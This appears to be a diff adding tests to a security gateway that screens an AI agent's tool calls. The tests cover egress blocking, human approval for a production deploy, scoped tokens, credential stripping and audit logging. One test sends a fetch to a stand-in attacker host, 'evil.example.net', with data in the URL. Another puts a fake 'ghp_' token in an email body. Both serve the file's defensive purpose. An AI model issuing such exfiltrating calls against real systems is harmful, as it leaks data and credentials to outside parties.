@@ -4,6 +4,7 @@ M3 done-when: replaying T1-003 through the gateway ends in BLOCK R1 at step 2.
 """
 
 import dataclasses
+import json
 from pathlib import Path
 
 import pytest
@@ -203,3 +204,101 @@ def test_known_false_positive_verbatim_quote_in_an_email():
     gw, _ = make()
     d = MockAgent(c).replay(gw).decision_at(2)
     assert d.verdict is Verdict.BLOCK and d.rules == ("R1",) and d.tainted_args == ("body",)
+
+
+# ---------------------------------------------------------------- M5: egress, approval, tokens, log
+
+from mcp_guard.approval import AutoApprove, AutoDeny, CLIApprover  # noqa: E402
+from mcp_guard.auditor import Auditor  # noqa: E402
+from mcp_guard.audit_log import AuditLog  # noqa: E402
+from mcp_guard.rules import r1_tainted_sink  # noqa: E402
+
+DEPLOY_PROD = ToolCall("workspace", "deploy", {"environment": "prod", "ref": "v2.1"}, session="s")
+
+
+def make_full(servers=None, **kwargs):
+    servers = servers if servers is not None else trusted_servers()
+    host = MockToolHost(servers, require_auth=True)
+    return Gateway.build(all_specs(servers), LOCK, POLICY, host, **kwargs), host
+
+
+def test_egress_holds_even_if_the_rule_set_drops_r4():
+    gw, host = make_full(auditor=Auditor(POLICY, rules=(r1_tainted_sink,)))
+    d = gw(ToolCall("web", "fetch_url", {"url": "https://evil.example.net/c?d=1"})).decision
+    assert d.verdict is Verdict.BLOCK and d.rules == ("R4",)
+    assert host.backend.web == {}
+
+
+def test_default_approver_denies_and_records_it():
+    gw, host = make_full()
+    out = gw(DEPLOY_PROD)
+    assert (out.decision.verdict, out.approved, out.approver, out.ran) == \
+        (Verdict.ESCALATE, False, "auto-deny", False)
+    assert host.backend.deploys == []
+    rec = json.loads(gw.log.lines[-1])
+    assert (rec["decision"], rec["approver"], rec["approved"]) == ("ESCALATE", "auto-deny", False)
+
+
+def test_approved_escalation_runs_with_a_scoped_token():
+    gw, host = make_full(approver=AutoApprove())
+    out = gw(DEPLOY_PROD)
+    assert out.decision.verdict is Verdict.ESCALATE and out.approved and out.ran
+    assert host.backend.deploys == [{"environment": "prod", "ref": "v2.1"}]
+    assert host.backend.auth_log[0]["token_tool"] == "workspace.deploy"
+    rec = json.loads(gw.log.lines[-1])
+    assert (rec["approver"], rec["approved"]) == ("auto-approve", True)
+
+
+def test_cli_approver_prompts_and_parses_answers():
+    said = []
+    for answer, expected in [("y", True), ("YES", True), ("n", False), ("", False)]:
+        approver = CLIApprover(ask=lambda _p, a=answer: a, say=said.append, name="amit")
+        gw, host = make_full(approver=approver)
+        out = gw(DEPLOY_PROD)
+        assert out.approved is expected and out.approver == "amit"
+        assert bool(host.backend.deploys) is expected
+    assert any("Approval needed: workspace.deploy" in line for line in said)
+    assert any("R3" in line for line in said)
+
+
+def test_cli_approver_treats_end_of_input_as_deny():
+    def eof(_prompt):
+        raise EOFError
+    gw, _ = make_full(approver=CLIApprover(ask=eof, say=lambda _s: None, name="x"))
+    assert gw(DEPLOY_PROD).approved is False
+
+
+def test_every_allowed_call_gets_its_own_tools_token():
+    gw, host = make_full()
+    gw(ToolCall("workspace", "read_file", {"path": "a"}, session="s"), "text")
+    gw(ToolCall("mail", "send_email", {"to": "alice@example.com", "body": "hi"},
+                task="email alice@example.com", session="t"))
+    tools = [(e["tool"], e["token_tool"]) for e in host.backend.auth_log]
+    assert tools == [("workspace.read_file", "workspace.read_file"), ("mail.send_email", "mail.send_email")]
+    assert host.backend.outbox and "401" not in str(host.backend.outbox)
+
+
+def test_credentials_are_stripped_if_r6_is_switched_off():
+    gw, host = make_full(auditor=Auditor(POLICY, rules=()))
+    out = gw(ToolCall("mail", "send_email",
+                      {"to": "alice@example.com", "body": "token ghp_" + "a1B2" * 9}))
+    assert out.decision.allowed
+    assert gw.last_stripped == ["body"]
+    assert "ghp_" not in host.backend.outbox[0]["body"]
+
+
+def test_one_log_record_per_decision_and_chain_verifies():
+    log = AuditLog()
+    gw, _ = make_full(log=log)
+    t = MockAgent(T1).replay(gw)
+    assert log.seq == len(t.steps) == 2
+    recs = [json.loads(line) for line in log.lines]
+    assert [r["decision"] for r in recs] == ["ALLOW", "BLOCK"]
+    assert recs[1]["rules"][0] == "R1" and recs[1]["tainted_args"] == ["to", "body"]
+    assert log.verify().ok
+
+
+def test_registry_events_are_logged_at_startup():
+    gw, _ = make_full(rug_pulled_servers())
+    first = json.loads(gw.log.lines[0])
+    assert (first["session"], first["tool"], first["rules"]) == ("gateway", "fetch_url", ["RUG_PULL"])
